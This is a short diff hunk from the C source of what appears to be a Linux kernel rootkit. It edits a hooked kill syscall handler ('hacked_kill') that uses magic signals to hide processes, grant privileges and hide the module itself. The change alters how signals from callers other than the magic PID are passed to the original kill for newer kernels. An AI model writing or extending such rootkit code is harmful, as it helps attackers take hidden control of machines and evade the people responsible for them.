@@ -337,7 +337,7 @@ hacked_kill(pid_t pid, int sig)
 		else module_hide();
 	}else if(pid != magicPrefixNum && (sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS)){
 		#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-			{ pt_regs->regs[0] = 12345678901234567890; return orig_kill(pt_regs); }
+			return orig_kill(pt_regs);
 		#else
 			return orig_kill(12345678901234567890, sig);
 		#endif
